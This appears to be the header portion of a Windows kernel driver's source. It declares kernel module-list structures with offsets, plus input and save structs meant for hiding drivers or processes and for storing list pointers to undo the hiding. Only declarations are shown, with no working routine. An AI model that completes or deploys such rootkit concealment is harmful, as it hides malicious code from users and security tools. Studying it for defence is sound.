#include <ntddk.h>
#include <ntstrsafe.h>

// ---------------------------------------------------------------
// structures for driver module enumeration
// ---------------------------------------------------------------
// Minimal LDR_DATA_TABLE_ENTRY structure
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;           // +0x000
    LIST_ENTRY InMemoryOrderLinks;         // +0x010
    LIST_ENTRY InInitializationOrderLinks; // +0x020
    PVOID      DllBase;                    // +0x030
    PVOID      EntryPoint;                 // +0x038
    ULONG      SizeOfImage;                // +0x040
    UNICODE_STRING FullDllName;            // +0x048
    UNICODE_STRING BaseDllName;            // +0x058
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

// args for hiding driver or process
typedef struct _SPY_HIDE_INPUT {
    CHAR g_Name[256];
} SPY_HIDE_INPUT, * PSPY_HIDE_INPUT;


// ---------------------------------------------------------------
// Global Saves (Future backup use)
// ---------------------------------------------------------------
// Driver unhide saving Flink and Blink pointers
typedef struct _SPY_UNHIDE_SAVE {
    char g_Name[256];
    PLIST_ENTRY Flink;
    PLIST_ENTRY Blink;
} SPY_DRIVER_UNHIDE_SAVE, * PSPY_DRIVER_UNHIDE_SAVE;

// ---------------------------------------------------------------
// Kernel exported globals
// ---------------------------------------------------------------
extern PLIST_ENTRY PsLoadedModuleList;
extern PERESOURCE  PsLoadedModuleResource;
//extern PEPROCESS PsInitialSystemProcess;
NTSYSAPI
PCHAR
NTAPI
PsGetProcessImageFileName(_In_ PEPROCESS Process);


